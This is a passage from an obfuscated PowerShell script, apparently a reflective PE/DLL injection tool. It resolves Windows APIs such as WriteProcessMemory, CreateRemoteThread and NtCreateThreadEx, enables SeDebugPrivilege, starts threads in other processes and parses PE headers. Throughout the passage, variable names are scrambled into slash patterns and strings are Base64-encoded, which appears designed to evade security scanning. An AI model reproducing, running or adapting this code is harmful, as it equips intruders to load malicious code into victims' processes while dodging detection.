		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${_/=====\_/==\_/\_}
		${/==\/=\/=====\/==} = ______/\_/=\__/=== kernel32.dll WriteProcessMemory
        ${___/==\/\_/\__/\/} = _/====\/==\______/ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${_/\/\/===\____/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/=\/=====\/==}, ${___/==\/\_/\__/\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${_/\/\/===\____/==}
		${___/=\/=\__/=====} = ______/\_/=\__/=== kernel32.dll ReadProcessMemory
        ${/\_________/====\} = _/====\/==\______/ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${_/==\__/\_/======} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=\/=\__/=====}, ${/\_________/====\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${_/==\__/\_/======}
		${/=\/\__/\_/\/=\__} = ______/\_/=\__/=== kernel32.dll CreateRemoteThread
        ${/=\_/\_/\___/=\_/} = _/====\/==\______/ @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${__/\__/======\/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/\__/\_/\/=\__}, ${/=\_/\_/\___/=\_/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${__/\__/======\/\/}
		${___/====\_____/=\} = ______/\_/=\__/=== kernel32.dll GetExitCodeThread
        ${_/=\/\___/\_/=\__} = _/====\/==\______/ @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${/=\___/=\__/\/==\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/====\_____/=\}, ${_/=\/\___/\_/=\__})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${/=\___/=\__/\/==\}
		${_/\/====\/\/\_/\_} = ______/\_/=\__/=== Advapi32.dll OpenThreadToken
        ${__/\/=\/=\__/\__/} = _/====\/==\______/ @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${_/\_/==\/\/\/===\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/====\/\/\_/\_}, ${__/\/=\/=\__/\__/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${_/\_/==\/\/\/===\}
		${____/\___/\/=\_/=} = ______/\_/=\__/=== kernel32.dll GetCurrentThread
        ${__/\/=\_/\__/\_/\} = _/====\/==\______/ @() ([IntPtr])
        ${____/\/\___/\_/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${____/\___/\/=\_/=}, ${__/\/=\_/\__/\_/\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${____/\/\___/\_/==}
		${/=\/=\___/\/\__/=} = ______/\_/=\__/=== Advapi32.dll AdjustTokenPrivileges
        ${__/==\/=====\/\_/} = _/====\/==\______/ @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${____/\/\/\_/==\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/=\___/\/\__/=}, ${__/==\/=====\/\_/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${____/\/\/\_/==\_/}
		${/===\/===\/\/===\} = ______/\_/=\__/=== Advapi32.dll LookupPrivilegeValueA
        ${______/==\/\__/==} = _/====\/==\______/ @([String], [String], [IntPtr]) ([Bool])
        ${__/\/==\/====\_/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/===\/\/===\}, ${______/==\/\__/==})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${__/\/==\/====\_/\}
		${/=====\_/\_/==\/\} = ______/\_/=\__/=== Advapi32.dll ImpersonateSelf
        ${__/\/=\__/=\_/=\/} = _/====\/==\______/ @([Int32]) ([Bool])
        ${_/\_/\/==\/\_____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=====\_/\_/==\/\}, ${__/\/=\__/=\_/=\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${_/\_/\/==\/\_____}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
		    ${___/=\/\__/\__/\_} = ______/\_/=\__/=== NtDll.dll NtCreateThreadEx
            ${/=\_/===\/\/\_/=\} = _/====\/==\______/ @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${___/\_/=\__/\____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=\/\__/\__/\_}, ${/=\_/===\/\/\_/=\})
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${___/\_/=\__/\____}
        }
		${_____/\_/\___/\_/} = ______/\_/=\__/=== Kernel32.dll IsWow64Process
        ${____/=\/==\___/\_} = _/====\/==\______/ @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${/=\/=\/=\/\/\/\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_____/\_/\___/\_/}, ${____/=\/==\___/\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${/=\/=\/=\/\/\/\_/}
		${_/\/\/=\_/\/=\___} = ______/\_/=\__/=== Kernel32.dll CreateThread
        ${/=\_/\_/==\__/\/\} = _/====\/==\______/ @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${/==\_/=\/========} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/\/=\_/\/=\___}, ${/=\_/\_/==\__/\/\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${/==\_/=\/========}
		return $Win32Functions
	}
	Function _/\____/===\/\_/==
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${___/\_/\_/====\_/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/====\___/==\___}
		)
		[Byte[]]${_/\_/=\_____/\/=\} = [BitConverter]::GetBytes(${___/\_/\_/====\_/=})
		[Byte[]]${/=====\/===\/===\} = [BitConverter]::GetBytes(${__/====\___/==\___})
		[Byte[]]${/==\___/====\____} = [BitConverter]::GetBytes([UInt64]0)
		if (${_/\_/=\_____/\/=\}.Count -eq ${/=====\/===\/===\}.Count)
		{
			${/===\_/=\_/=\/\__} = 0
			for (${/=\/\/\/\_______/} = 0; ${/=\/\/\/\_______/} -lt ${_/\_/=\_____/\/=\}.Count; ${/=\/\/\/\_______/}++)
			{
				${/=\/=\/=\/==\_/=\} = ${_/\_/=\_____/\/=\}[${/=\/\/\/\_______/}] - ${/===\_/=\_/=\/\__}
				if (${/=\/=\/=\/==\_/=\} -lt ${/=====\/===\/===\}[${/=\/\/\/\_______/}])
				{
					${/=\/=\/=\/==\_/=\} += 256
					${/===\_/=\_/=\/\__} = 1
				}
				else
				{
					${/===\_/=\_/=\/\__} = 0
				}
				[UInt16]${_/\/\/\/===\____/} = ${/=\/=\/=\/==\_/=\} - ${/=====\/===\/===\}[${/=\/\/\/\_______/}]
				${/==\___/====\____}[${/=\/\/\/\_______/}] = ${_/\/\/\/===\____/} -band 0x00FF
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${/==\___/====\____}, 0)
	}
	Function ____/\____/====\/=
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${___/\_/\_/====\_/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/====\___/==\___}
		)
		[Byte[]]${_/\_/=\_____/\/=\} = [BitConverter]::GetBytes(${___/\_/\_/====\_/=})
		[Byte[]]${/=====\/===\/===\} = [BitConverter]::GetBytes(${__/====\___/==\___})
		[Byte[]]${/==\___/====\____} = [BitConverter]::GetBytes([UInt64]0)
		if (${_/\_/=\_____/\/=\}.Count -eq ${/=====\/===\/===\}.Count)
		{
			${/===\_/=\_/=\/\__} = 0
			for (${/=\/\/\/\_______/} = 0; ${/=\/\/\/\_______/} -lt ${_/\_/=\_____/\/=\}.Count; ${/=\/\/\/\_______/}++)
			{
				[UInt16]${_/\/\/\/===\____/} = ${_/\_/=\_____/\/=\}[${/=\/\/\/\_______/}] + ${/=====\/===\/===\}[${/=\/\/\/\_______/}] + ${/===\_/=\_/=\/\__}
				${/==\___/====\____}[${/=\/\/\/\_______/}] = ${_/\/\/\/===\____/} -band 0x00FF
				if ((${_/\/\/\/===\____/} -band 0xFF00) -eq 0x100)
				{
					${/===\_/=\_/=\/\__} = 1
				}
				else
				{
					${/===\_/=\_/=\/\__} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${/==\___/====\____}, 0)
	}
	Function __/=\/\/=\/\_/==\_
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${___/\_/\_/====\_/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/====\___/==\___}
		)
		[Byte[]]${_/\_/=\_____/\/=\} = [BitConverter]::GetBytes(${___/\_/\_/====\_/=})
		[Byte[]]${/=====\/===\/===\} = [BitConverter]::GetBytes(${__/====\___/==\___})
		if (${_/\_/=\_____/\/=\}.Count -eq ${/=====\/===\/===\}.Count)
		{
			for (${/=\/\/\/\_______/} = ${_/\_/=\_____/\/=\}.Count-1; ${/=\/\/\/\_______/} -ge 0; ${/=\/\/\/\_______/}--)
			{
				if (${_/\_/=\_____/\/=\}[${/=\/\/\/\_______/}] -gt ${/=====\/===\/===\}[${/=\/\/\/\_______/}])
				{
					return $true
				}
				elseif (${_/\_/=\_____/\/=\}[${/=\/\/\/\_______/}] -lt ${/=====\/===\/===\}[${/=\/\/\/\_______/}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		[Byte[]]${/=\/===\/\___/===} = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64(${/=\/===\/\___/===}, 0))
	}
    Function _/==\___/==\/\___/
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value 
        )
        ${_/\____/\____/\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        ${__/\_/===\_/\___/} = "0x{0:X$(${_/\____/\____/\_/})}" -f [Int64]$Value 
        return ${__/\_/===\_/\___/}
    }
	Function __/==\/===\___/=\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${_/=====\_/=\___/==},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_/=====\_/=\/\___/},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${_/==\__/=\_/=\/\_/},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${_____/=\_/\_/===\_}
		)
	    [IntPtr]${__/\___/=\____/\/} = [IntPtr](____/\____/====\/= (${_/==\__/=\_/=\/\_/}) (${_____/=\_/\_/===\_}))
		${/=\/\_/\/==\/\/\/} = ${_/=====\_/=\/\___/}.EndAddress
		if ((__/=\/\/=\/\_/==\_ (${_/=====\_/=\/\___/}.PEHandle) (${_/==\__/=\_/=\/\_/})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAHMAbQBhAGwAbABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwAvAD0APQA9AD0APQBcAF8ALwA9AFwAXwBfAF8ALwA9AD0AfQA=')))
		}
		if ((__/=\/\/=\/\_/==\_ (${__/\___/=\____/\/}) (${/=\/\_/\/==\/\/\/})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwAvAD0APQA9AD0APQBcAF8ALwA9AFwAXwBfAF8ALwA9AD0AfQA=')))
		}
	}
	Function __/\/\/===\__/==\/
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${_/=\/=\_/\_____/=\},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${__/\/\/\__/\_/\/\_}
		)
		for (${_/\/==\____/\/=\/} = 0; ${_/\/==\____/\/=\/} -lt ${_/=\/=\_/\_____/=\}.Length; ${_/\/==\____/\/=\/}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${__/\/\/\__/\_/\/\_}, ${_/\/==\____/\/=\/}, ${_/=\/=\_/\_____/=\}[${_/\/==\____/\/=\/}])
		}
	}
	Function _/====\/==\______/
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${___/\_/====\/=\/==} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${_/=\/==\_/=\/=\__/} = [Void]
	    )
	    ${_/=\/=\/==\/\/=\/} = [AppDomain]::CurrentDomain
	    ${/==\/\_/====\_/=\} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${_/=\/\/\_/\/\/===} = ${_/=\/=\/==\/\/=\/}.DefineDynamicAssembly(${/==\/\_/====\_/=\}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${_/==\/\_/\_/==\_/} = ${_/=\/\/\_/\/\/===}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${/==\/=\__/==\/\/\} = ${_/===\/\/\_/==\__}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${___/\_/====\/=\/==})
	    ${/==\/=\__/==\/\/\}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${___/\/\_/=\_/\__/} = ${_/===\/\/\_/==\__}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${_/=\/==\_/=\/=\__/}, ${___/\_/====\/=\/==})
	    ${___/\/\_/=\_/\__/}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${_/===\/\/\_/==\__}.CreateType()
	}
	Function ______/\_/=\__/===
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${__/\/==\/==\/\____},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${__/==\/==\__/\/=\_}
	    )
	    ${/==\____/\/\/\_/=} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${/==\/===\____/=\/} = ${/==\____/\/\/\_/=}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${/=\/\/==\/\___/\/} = ${/==\/===\____/=\/}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${_/\___/=\_/===\_/} = ${/==\/===\____/=\/}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
	    ${__/=\/==\_/\_____} = ${/=\/\/==\/\___/\/}.Invoke($null, @(${__/\/==\/==\/\____}))
	    ${_/\_/\/=\/\/\_/=\} = New-Object IntPtr
	    ${_/===\_/\_/\/\/\_} = New-Object System.Runtime.InteropServices.HandleRef(${_/\_/\/=\/\/\_/=\}, ${__/=\/==\_/\_____})
	    echo ${_/\___/=\_/===\_/}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${_/===\_/\_/\/\/\_}, ${__/==\/==\__/\/=\_}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[IntPtr]${___/=\/\__/\/==\_} = $Win32Functions.GetCurrentThread.Invoke()
		if (${___/=\/\__/\/==\_} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]${___/\__/====\/\/=} = [IntPtr]::Zero
		[Bool]${_/==\/=\__/\___/\} = $Win32Functions.OpenThreadToken.Invoke(${___/=\/\__/\/==\_}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${___/\__/====\/\/=})
		if (${_/==\/=\__/\___/\} -eq $false)
		{
			${_/\/\_/\/==\/===\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${_/\/\_/\/==\/===\} -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				${_/==\/=\__/\___/\} = $Win32Functions.ImpersonateSelf.Invoke(3)
				if (${_/==\/=\__/\___/\} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${_/==\/=\__/\___/\} = $Win32Functions.OpenThreadToken.Invoke(${___/=\/\__/\/==\_}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${___/\__/====\/\/=})
				if (${_/==\/=\__/\___/\} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AF8ALwBcAC8AXABfAC8AXAAvAD0APQBcAC8APQA9AD0AXAB9AA==')))
			}
		}
		[IntPtr]${/=\__/=\_/\___/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		${_/==\/=\__/\___/\} = $Win32Functions.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), ${/=\__/=\_/\___/\/})
		if (${_/==\/=\__/\___/\} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]${/=\__/===\/\_/\/\} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]${_/\__/\_____/\/=\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\__/===\/\_/\/\})
		${_/\/=\_/\___/\/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\__/\_____/\/=\}, [Type]$Win32Types.TOKEN_PRIVILEGES)
		${_/\/=\_/\___/\/=\}.PrivilegeCount = 1
		${_/\/=\_/\___/\/=\}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\__/=\_/\___/\/}, [Type]$Win32Types.LUID)
		${_/\/=\_/\___/\/=\}.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\/=\_/\___/\/=\}, ${_/\__/\_____/\/=\}, $true)
		${_/==\/=\__/\___/\} = $Win32Functions.AdjustTokenPrivileges.Invoke(${___/\__/====\/\/=}, $false, ${_/\__/\_____/\/=\}, ${/=\__/===\/\_/\/\}, [IntPtr]::Zero, [IntPtr]::Zero)
		${_/\/\_/\/==\/===\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${_/==\/=\__/\___/\} -eq $false) -or (${_/\/\_/\/==\/===\} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/\__/\_____/\/=\})
	}
	Function _/===\_/\_/\/==\_/
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${___/=\/=\/====\___},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${_/==\__/=\_/=\/\_/},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${_/=\_/\/==\__/\/\/} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		[IntPtr]${____/=\_/==\/=\__} = [IntPtr]::Zero
		${_/\/\/===\/=\___/} = [Environment]::OSVersion.Version
		if ((${_/\/\/===\/=\___/} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${_/\/\/===\/=\___/} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
		{
			${___/=\_/====\____}= $Win32Functions.NtCreateThreadEx.Invoke([Ref]${____/=\_/==\/=\__}, 0x1FFFFF, [IntPtr]::Zero, ${___/=\/=\/====\___}, ${_/==\__/=\_/=\/\_/}, ${_/=\_/\/==\__/\/\/}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${___/\______/\/===} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${____/=\_/==\/=\__} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAATgB0AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAEUAeAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewBfAF8AXwAvAD0AXABfAC8APQA9AD0APQBcAF8AXwBfAF8AfQAuACAATABhAHMAdABFAHIAcgBvAHIAOgAgACQAewBfAF8AXwAvAFwAXwBfAF8AXwBfAF8ALwBcAC8APQA9AD0AfQA=')))
			}
		}
		else
		{
			${____/=\_/==\/=\__} = $Win32Functions.CreateRemoteThread.Invoke(${___/=\/=\/====\___}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${_/==\__/=\_/=\/\_/}, ${_/=\_/\/==\__/\/\/}, 0, [IntPtr]::Zero)
		}
		if (${____/=\_/==\/=\__} -eq [IntPtr]::Zero)
		{
			Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA'))) -ErrorAction Stop
		}
		return ${____/=\_/==\/=\__}
	}
	Function __/===\_/\/\/=\/\_
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/=\____/\_/\/\_/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${_/\/\__/=\/\/=\_/} = New-Object System.Object
		${___/==\_/\/\/\_/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=\____/\_/\/\_/}, [Type]$Win32Types.IMAGE_DOS_HEADER)
		[IntPtr]${/=\__/==\/=\/\_/\} = [IntPtr](____/\____/====\/= ([Int64]${__/=\____/\_/\/\_/}) ([Int64][UInt64]${___/==\_/\/\/\_/=}.e_lfanew))
		${_/\/\__/=\/\/=\_/} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${/=\__/==\/=\/\_/\}
		${_/=\/\/\/==\_____} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\__/==\/=\/\_/\}, [Type]$Win32Types.IMAGE_NT_HEADERS64)
	    if (${_/=\/\/\/==\_____}.Signature -ne 0x00004550)
	    {
	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${_/=\/\/\/==\_____}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${_/\/\__/=\/\/=\_/} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${_/=\/\/\/==\_____}
			${_/\/\__/=\/\/=\_/} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${/=\/==\/\/==\/\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\__/==\/=\/\_/\}, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			${_/\/\__/=\/\/=\_/} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${/=\/==\/\/==\/\/\}
